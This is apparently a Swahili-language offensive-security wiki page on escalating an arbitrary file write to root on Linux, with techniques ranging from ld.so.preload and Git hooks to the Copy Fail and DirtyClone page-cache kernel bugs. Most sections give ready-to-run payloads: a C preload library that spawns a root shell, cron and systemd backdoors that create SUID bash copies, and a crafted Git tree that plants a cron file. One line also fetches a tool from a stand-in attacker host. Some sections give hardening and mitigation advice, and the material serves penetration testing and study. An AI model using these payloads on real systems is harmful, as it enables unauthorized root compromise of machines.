# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` ni orodha ya system-wide ya shared objects ambazo dynamic linker hupakia kabla ya shared objects nyingine. Secure-execution mode huweka restrictions za ziada kwenye preloading, kwa hivyo library path kama `/tmp/pe.so` si mbinu ya SUID-binary inayofanya kazi kila mahali.\
Ikiwa unaweza kuunda au kuibadilisha, process inayopakia file hiyo itapakia library iliyoorodheshwa kabla ya shared objects zake nyingine, hivyo kuwezesha code execution katika context ya process hiyo.<sup>[[12]](#references)</sup>

Kwa mfano: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** ni scripts zinazoweza kutekelezwa zinazoendeshwa kwa matukio katika repository, ikiwa ni pamoja na shughuli za commit na merge. Ikiwa **script au user mwenye privileged** anafanya shughuli hizo na attacker anaweza **kuandika katika folder ya `.git`**, hook inaweza kutumiwa kwa **privilege escalation**.<sup>[[13]](#references)</sup>

Kwa mfano, inawezekana **kutengeneza script** katika git repo ndani ya **`.git/hooks`** ili itekelezwe kila wakati commit mpya inapoundwa:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal katika privileged Git tree export

Synchronizer yenye privileges inaweza kuepuka checkout na badala yake kuorodhesha repository inayoathiriwa na attacker kwa `git ls-tree`, kusoma kila blob kwa `git cat-file`, kuunganisha pathname iliyoripotiwa na staging directory, kisha kuiandika yenyewe. Hii huwa **arbitrary file write with the synchronizer's privileges** inapounganisha `-c safe.directory=*` (ikizima ulinzi wa Git wa repository inayomilikiwa na mmiliki tofauti) na kutokuwepo kwa ukaguzi wa destination containment. Jina la tree-entry lililo absolute hufanya Python's `os.path.join(stage, name)` ipuuze `stage`; jina la relative lenye `../` hutoka nje wakati filesystem inapolitatua. Kwa sababu application hutengeneza raw tree badala ya kuiomba Git ifanye checkout, ukataliwa kwa pathname wakati wa checkout kamwe hakulindi sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Tafuta muundo huu wa code katika root services, timers, deployment agents, template importers, na backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Ingizo la tree husimbwa kama `<mode> SP <name> NUL <raw object ID>`. Chaguo la `git hash-object --literally` huruhusu kimakusudi data ya object ambayo uchanganuzi wa kawaida au `git fsck` unaweza kukataa, hivyo clone ya muda inaweza kuunda tree ambayo filename yake ni destination ya absolute. Mfano huu huunda blob ya cron-file, hufunga tree iliyoundwa kuwa commit, na kuhamisha branch kuielekeza hapo; exploitation bado inahitaji ruhusa ya kusasisha repository inayotumiwa na kazi yenye privileged na Git server inayokubali object iliyoharibika.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening lazima ihusishe uingizaji wa repository na operesheni ya mwisho ya filesystem:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Badilisha `safe.directory=*` na repositories halisi ambazo service lazima iziamini, na endesha uchakataji wa repository bila root privileges inapowezekana.
- Kataa majina ya absolute na component yoyote ya `.` au `..` kabla ya materialization. Baada ya kuunganisha, canonicalize na uthibitishe kuwa destination inabaki chini ya root iliyokusudiwa.
- Epuka symlink races za check-then-open: fungua ukiwa relative to trusted directory descriptor na, kwenye Linux, tumia `openat2()` yenye `RESOLVE_BENEATH` pamoja na `RESOLVE_NO_SYMLINKS` kwa paths zinazodhibitiwa na attacker.
- Pendelea checkout ya kawaida kwenye directory iliyotengwa badala ya kuunda upya checkout kutoka kwa plumbing output. Ikiwa raw-object ingestion inahitajika, wezesha receive-side validation kama `receive.fsckObjects=true`; usipunguze `receive.fsck.*` findings zinazohusiana na pathname zinazohitajika kukataa trees zilizoundwa kwa hila.

### Faili za Cron na Muda

Ikiwa unaweza **kuandika faili zinazohusiana na cron ambazo root huzitekeleza**, kwa kawaida unaweza kupata code execution kazi hiyo itakapoendeshwa tena. Targets zinazovutia ni pamoja na:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- crontab ya root yenyewe katika `/var/spool/cron/` au `/var/spool/cron/crontabs/`
- `systemd` timers na services zinazoanzishwa nazo

Ukaguzi wa haraka:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Njia za kawaida za matumizi mabaya:

- **Append a new root cron job** kwenye `/etc/crontab` au faili katika `/etc/cron.d/`
- **Replace a script** ambayo tayari inaendeshwa na `run-parts`
- **Backdoor an existing timer target** kwa kurekebisha script au binary ambayo inaizindua

Mfano wa minimal cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ikiwa unaweza kuandika tu ndani ya saraka ya cron inayotumiwa na `run-parts`, weka faili linaloweza kutekelezwa humo badala yake:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Vidokezo:

- `run-parts` kwa kawaida hupuuza majina ya faili yenye nukta, hivyo tumia majina kama `backup` badala ya `backup.sh`.<sup>[[15]](#references)</sup>
- Baadhi ya systems hutumia timers za `systemd` badala ya cron ya kawaida, lakini wazo la abuse ni lilelile: **rekebisha kitakachotekelezwa na root baadaye**.<sup>[[20]](#references)</sup>

### Faili za Service na Socket

Ikiwa unaweza kuandika **`systemd` unit files** au faili zinazoonyeshwa na hizo, unaweza kupata code execution kama root kwa kureload na kurestart unit, au kwa kusubiri service/socket activation path i-trigger.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Targets zinazovutia ni pamoja na:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides katika `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries zinazoonyeshwa na `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- `EnvironmentFile=` paths zinazoweza kuandikwa na service inayoendeshwa kama root

Ukaguzi wa haraka:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Njia za kawaida za abuse:

- **Overwrite `ExecStart=`** katika service unit inayomilikiwa na root ambayo unaweza kurekebisha
- **Add a drop-in override** yenye `ExecStart=` hasidi na kwanza uondoe ile ya zamani
- **Backdoor script/binary** ambayo tayari imerejelewa na unit
- **Hijack a socket-activated service** kwa kurekebisha faili ya `.service` inayohusika, ambayo huanza socket inapopokea connection

Mfano wa malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Mtiririko wa kawaida wa activation:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ikiwa huwezi kuanzisha upya services mwenyewe lakini unaweza kuhariri unit iliyoamilishwa na socket, huenda ukahitaji tu **kusubiri connection ya client** ili kuanzisha execution ya service yenye backdoor kama root.<sup>[[17]](#references)</sup>

### Overwrite `php.ini` yenye vikwazo inayotumiwa na PHP sandbox yenye privileges

Baadhi ya daemons maalum huthibitisha PHP inayotolewa na user kwa kuendesha `php` ikiwa na **`php.ini` yenye vikwazo** (kwa mfano, `disable_functions=exec,system,...`). Ikiwa code iliyo kwenye sandbox bado ina **write primitive** yoyote (kama `file_put_contents`) na unaweza kufikia **path kamili ya `php.ini`** inayotumiwa na daemon, unaweza **ku-overwrite config hiyo** ili kuondoa restrictions, kisha utume payload ya pili inayoendesha na privileges zilizoinuliwa.<sup>[[2]](#references)</sup>

Mtiririko wa kawaida:

1. Payload ya kwanza hu-overwrite sandbox config.
2. Payload ya pili hu-execute code baada ya dangerous functions kuwezeshwa tena.

Mfano mdogo (badilisha path inayotumiwa na daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ikiwa daemon inaendeshwa kama root (au inathibitisha kwa kutumia paths zinazomilikiwa na root), execution ya pili hutoa context ya root. Hii kimsingi ni **privilege escalation via config overwrite** wakati runtime iliyo kwenye sandbox bado inaweza kuandika files.

### binfmt_misc

`binfmt_misc` hufichua registrations chini ya `/proc/sys/fs/binfmt_misc`; kila registration huhusisha pattern ya aina ya file na interpreter. Athari ya privilege hutegemea ni nani anayeweza kubadilisha registration na ni process gani baadaye hutekeleza file linalolingana, kwa hivyo thibitisha mahitaji hayo kabla ya kuichukulia kama njia ya privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop environments hutumia MIME associations na desktop entries kuchagua application kwa URI schemes; attacker anayeweza kuandika configuration inayohusika ya kila user na directories za desktop entries anaweza kuelekeza schemes hizo kwa launcher anayoidhibiti. Kwa kurekebisha file ya `$HOME/.config/mimeapps.list` ili kuelekeza HTTP na HTTPS URL handlers kwenye file hasidi (kwa mfano, `x-scheme-handler/http=evil.desktop` na `x-scheme-handler/https=evil.desktop`), click ya user inaweza kuinvoke desktop entry hiyo.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root akiendesha scripts/binaries zinazoandikika na mtumiaji

Ikiwa privileged workflow inaendesha kitu kama `/bin/sh /home/username/.../script` (au binary yoyote ndani ya directory inayomilikiwa na user asiye na privileged access), unaweza kuiteka:<sup>[[1]](#references)</sup>

- **Tambua execution:** fuatilia processes kwa kutumia pspy ili kugundua root ikiendesha user-controlled paths.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Thibitisha uwezo wa kuandikwa:** hakikisha faili lengwa na directory yake vinamilikiwa na mtumiaji wako au vinaweza kuandikwa na mtumiaji wako.
- **Hijack target:** hifadhi nakala ya binary/script asili na weka payload inayounda SUID shell (au root action nyingine), kisha rejesha permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (mfano, kubonyeza kitufe cha UI kinachoanzisha helper). Root inapotekeleza tena path iliyotekwa, pata shell yenye privileges zilizopandishwa kwa `./rootshell -p`.

### Marekebisho ya privileged binaries katika page cache pekee

Baadhi ya kernel bugs hazibadilishi file **kwenye disk**. Badala yake, zinakuruhusu kurekebisha tu **copy ya page cache** ya file inayoweza kusomeka. Ukilenga binary ya **setuid** au file nyingine inayotekelezwa na **root**, execution inayofuata inaweza kuendesha bytes zinazodhibitiwa na attacker kutoka kwenye memory na kupandisha privileges, ingawa file hash iliyo kwenye disk haijabadilika.<sup>[[3]](#references)[[4]](#references)</sup>

Hii ni muhimu kuifikiria kama **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk inabaki safi**: inode na bytes zilizo kwenye disk hazibadiliki
- **Memory inakuwa dirty**: processes zinazosoma au ku-execute page iliyoko kwenye cache hupata content iliyorekebishwa na attacker
- **Athari ni ya muda**: mabadiliko hutoweka baada ya reboot au cache eviction

Primitive hii iko kati ya **arbitrary file write** ya kawaida na bugs za zamani za **page-cache abuse** kama Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW ilitegemea race
- Dirty Pipe ilikuwa na vikwazo vya write-position
- Primitive ya page-cache-only inaweza kuwa ya kuaminika zaidi ikiwa vulnerable path inatoa writes za moja kwa moja kwenye cached file-backed pages

#### Mtiririko wa jumla wa privesc

1. Pata kernel primitive inayoweza kuandika kwenye **file-backed page cache pages**
2. Itumie dhidi ya **readable privileged binary** au file nyingine inayotekelezwa na root
3. Trigger execution **kabla** page haijaondolewa kwenye cache
4. Pata code execution kama root huku file ya kwenye disk bado ikionekana haijabadilishwa

Malengo ya kawaida yenye thamani kubwa:

- Binaries za **setuid-root**
- Helpers zinazoanzishwa na **root services**
- Binaries zinazo-execute mara nyingi kutoka kwenye **containers zinazoshiriki host kernel/page cache**

#### Njia ya mfano ya AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) ni mfano mzuri wa class hii. Vulnerable path ilikuwa kwenye Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` inaweza kuhamisha references za page-cache pages kutoka kwenye file inayoweza kusomeka kwenda kwenye crypto TX scatterlist
- `algif_aead` in-place decrypt path ilitumia tena source na destination buffers
- `authencesn` kisha iliandika kwenye destination tag region
- region hiyo ilipokuwa bado inareference file-backed pages zilizosplice, write iliingia kwenye **page cache ya target file**

Kwa hiyo technique inayovutia si CVE yenyewe, bali pattern hii:

- **ingiza file-backed cache pages kwenye kernel subsystem**
- ifanye subsystem **izichukulie kama writable output**
- trigger overwrite ndogo inayodhibitiwa kwenye memory

Public PoC ilitumia **4-byte writes** zinazorudiwa kupatch `/usr/bin/su` kwenye memory, kisha ika-execute file hiyo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Njia ya mfano ya ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) inaonyesha variant nyingine ya pattern hiyo hiyo ya **page-cache-only write-to-root**, lakini safari hii sink ni **IPsec ESP decrypt** badala ya `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Technique muhimu ni hatua ya **metadata-laundering**:

- `splice()` huweka **read-only file-backed page-cache page** kwenye packet ya ESP-in-UDP
- mitigation ya awali ya DirtyFrag ili-tag skb hiyo kwa `SKBFL_SHARED_FRAG` ili `esp_input()` ifanye **copy kabla ya decrypting**
- netfilter `TEE` inaduplika packet kupitia `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone inabaki na **physical page-cache reference ile ile**, lakini inapoteza `SKBFL_SHARED_FRAG`
- `esp_input()` kisha huichukulia clone kuwa salama na inaendesha **in-place `cbc(aes)` decrypt** juu ya file-backed page

Kwa hiyo somo kwa reviewer ni pana zaidi ya CVE: ikiwa mitigation inategemea **skb/page metadata** kuamua kama operation lazima ifanye copy kwanza, clone/copy path yoyote ambayo inahifadhi **backing page** lakini inaondoa **metadata** inaweza kufungua tena write primitive bila kuonekana.

Mtiririko wa kawaida wa exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` ili kupata **`CAP_NET_ADMIN` ndani ya private network namespace**
2. washa loopback na usakinishe **netfilter `TEE` rule** kwenye `mangle/OUTPUT`
3. sakinisha **XFRM ESP transport SAs** kupitia `NETLINK_XFRM`
4. encode kila target 4-byte word kwenye SA `seq_hi` field (word-selection trick ya DirtyFrag)
5. tuma packet ya spliced ESP-in-UDP ili **TEE clone** ifikie `esp_input()` na ifanye decrypt **in place**
6. rudia hadi copy ya page-cache ya `/usr/bin/su` au executable nyingine yenye privileges iwe na code inayodhibitiwa na attacker

Kiutendaji, impact ni sawa na mfano wa `AF_ALG`: file iliyo kwenye disk inabaki safi, lakini `execve()` hutumia **page-cache bytes zilizobadilishwa** na kutoa root.<sup>[[8]](#references)[[9]](#references)</sup>

Ukaguzi muhimu wa exposure kwa variant hii:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kupunguza eneo la mashambulizi kwa muda mfupi pia kunategemea path hapa: kuboresha hadi kernel yenye `48f6a5356a33` hurekebisha clone path, huku kuzuia autoload ya `xt_TEE` kukiondoa **flag-laundering step**, na kuzuia `esp4` / `esp6` kukiondoa **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposure na hunting

Ikiwa unashuku aina hii ya bug, usitegemee tu ukaguzi wa integrity ya disk. Pia thibitisha:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Thamani za usanidi zilizo hapa chini hutofautisha interface inayoweza kupakiwa na ile iliyojengwa ndani ya kernel; sheria za ujenzi wa crypto huunganisha `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` inaweza kupakiwa/kutolewa kama module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface imejengwa ndani ya kernel
- setuid binaries ni targets nzuri kwa sababu patch ya page-cache-only inaweza kutosha kubadilisha foothold ya ndani kuwa root

#### Kupunguza attack surface kwa njia ya `algif_aead`

Ikiwa interface yenye vulnerability inatolewa na module inayoweza kupakiwa:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ikiwa imekompilishwa kwenye kernel, baadhi ya disclosures ziliripoti kuzuia init path kwa:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Aina hii ya mitigation inafaa kukumbukwa pia kwa kernel LPE nyingine: ikiwa exploitation inategemea interface maalum ya hiari, ku-disable au kui-blacklist interface hiyo kunaweza kuvunja njia ya exploit hata kabla full kernel upgrade haijapatikana.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – hijacking script inayotekelezwa na root katika directory ya PaperCut inayoweza kuandikwa na user](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) — FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Ufichuzi wa Openwall oss-security kuhusu CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — ushauri wa CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: Kuchambua na kufanya Exploiting ya Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — ukurasa wa mwongozo wa Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — nyaraka za Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: Linux kernel AF_ALG page cache vulnerability](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Nyaraka za Git `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Nyaraka za Git `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Nyaraka za Git configuration](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
